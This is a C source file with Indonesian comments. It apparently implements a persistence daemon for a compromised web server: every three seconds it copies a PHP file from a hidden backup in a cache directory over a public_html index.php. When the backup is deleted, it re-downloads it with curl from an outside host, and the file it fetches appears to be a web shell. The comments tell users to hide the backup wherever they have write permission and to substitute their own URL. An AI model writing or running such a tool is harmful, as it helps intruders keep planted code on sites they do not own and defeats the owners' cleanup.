// trigger.c
#define _POSIX_C_SOURCE 200809L
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <time.h>

#define SRC_FILE "/var/cache/php-eaccelerator/index.php" // path backup file ( bebas mau dmana aja asalkan permision nya bisa edit/upload )
#define DST_FILE "/home/userhome/public_html/test/index.php" // path file yang ingin di trigger
#define SLEEP_SEC 3
#define TMP_SUFFIX ".restore_tmp"
// optional: kalau mau auto-download ketika sumber hilang, ganti DOWNLOAD_URL jadi "https://smokykontolodon.com/memekkuda.php"
#define DOWNLOAD_URL "https://smokykontolodon.com/memekkuda.php" // ini ganti aja dengan url backup file kalian

static void logmsgf(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    time_t now = time(NULL);
    struct tm t;
    localtime_r(&now, &t);
    char ts[64];
    strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", &t);

    fprintf(stderr, "[%s] ", ts);
    vfprintf(stderr, fmt, ap);
    fprintf(stderr, "\n");
    fflush(stderr);
    va_end(ap);
}

static int mkdir_p(const char *path, mode_t mode) {
    char tmp[4096];
    size_t len = strlen(path);
    if (len == 0 || len >= sizeof(tmp)) return -1;
    strcpy(tmp, path);
    if (tmp[len-1] == '/') tmp[len-1] = '\0';
    for (char *p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = '\0';
            mkdir(tmp, mode); 
            *p = '/';
        }
    }
    return mkdir(tmp, mode);
}

static int files_equal(const char *a, const char *b) {
    struct stat sa, sb;
    if (stat(a, &sa) != 0) return -1;
    if (stat(b, &sb) != 0) return -1;
    if (sa.st_size != sb.st_size) return 0;

    int fa = open(a, O_RDONLY);
    if (fa < 0) return -1;
    int fb = open(b, O_RDONLY);
    if (fb < 0) { close(fa); return -1; }

    ssize_t ra, rb;
    char ba[8192], bb[8192];
    off_t off = 0;
    int equal = 1;
    while ((ra = read(fa, ba, sizeof(ba))) > 0) {
        rb = read(fb, bb, ra);
        if (rb != ra) { equal = 0; break; }
        if (memcmp(ba, bb, ra) != 0) { equal = 0; break; }
        off += ra;
    }
    if (ra < 0) equal = -1;
    close(fa);
    close(fb);
    return equal;
}

static int copy_atomic(const char *src, const char *dst) {
    struct stat st;
    if (stat(src, &st) != 0) return -1;

    int sfd = open(src, O_RDONLY);
    if (sfd < 0) return -2;

    char tmp[4096];
    snprintf(tmp, sizeof(tmp), "%s%s", dst, TMP_SUFFIX);

    int dfd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC, st.st_mode & 0777);
    if (dfd < 0) { close(sfd); return -3; }

    ssize_t n;
    char buf[8192];
    while ((n = read(sfd, buf, sizeof(buf))) > 0) {
        ssize_t w = 0, off = 0;
        while (off < n) {
            w = write(dfd, buf + off, n - off);
            if (w < 0) { close(sfd); close(dfd); unlink(tmp); return -4; }
            off += w;
        }
    }
    if (n < 0) { close(sfd); close(dfd); unlink(tmp); return -5; }

    if (fsync(dfd) != 0) {
    }
    close(sfd);
    if (close(dfd) != 0) { unlink(tmp); return -6; }

    chmod(tmp, st.st_mode & 0777);

    if (rename(tmp, dst) != 0) { unlink(tmp); return -7; }

    return 0;
}

static void try_redownload_source(void) {
#ifdef DOWNLOAD_URL
#endif
    if (sizeof(DOWNLOAD_URL) && strlen(DOWNLOAD_URL) > 0) {
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "curl -s -L -o '%s' '%s'", SRC_FILE, DOWNLOAD_URL);
        logmsgf("Sumber tidak ditemukan. Mencoba download ulang dari %s", DOWNLOAD_URL);
        int rc = system(cmd);
        (void)rc;
    }
}

int main(void) {
    logmsgf("Restore daemon started: %s -> %s (interval %d sec)", SRC_FILE, DST_FILE, SLEEP_SEC);

    for (;;) {
        char dst_dir[4096];
        strncpy(dst_dir, DST_FILE, sizeof(dst_dir));
        char *p = strrchr(dst_dir, '/');
        if (p) {
            *p = '\0';
            struct stat st;
            if (stat(dst_dir, &st) != 0) {
                if (mkdir_p(dst_dir, 0755) != 0) {
                    logmsgf("Gagal membuat direktori %s: %s", dst_dir, strerror(errno));
                    sleep(SLEEP_SEC);
                    continue;
                } else {
                    logmsgf("Direktori tujuan dibuat: %s", dst_dir);
                }
            }
        }

        struct stat sst;
        if (stat(SRC_FILE, &sst) != 0) {
            logmsgf("File sumber %s tidak ditemukan.", SRC_FILE);
            if (strlen(DOWNLOAD_URL) > 0) try_redownload_source();
            sleep(SLEEP_SEC);
            continue;
        }

        struct stat dstst;
        int do_copy = 1;
        if (stat(DST_FILE, &dstst) == 0) {
            int eq = files_equal(SRC_FILE, DST_FILE);
            if (eq == 1) {
                logmsgf("Sumber identik dengan tujuan; skip menimpa.");
                do_copy = 0;
            } else if (eq == 0) {
                do_copy = 1;
            } else {
                logmsgf("Gagal membandingkan file; akan coba overwrite.");
                do_copy = 1;
            }
        } else {
            do_copy = 1;
        }

        if (do_copy) {
            int rc = copy_atomic(SRC_FILE, DST_FILE);
            if (rc == 0) {
                logmsgf("Berhasil restore %s -> %s", SRC_FILE, DST_FILE);
            } else {
                logmsgf("Gagal restore (code %d): %s", rc, strerror(errno));
            }
        }

        sleep(SLEEP_SEC);
    }

    return 0;
}
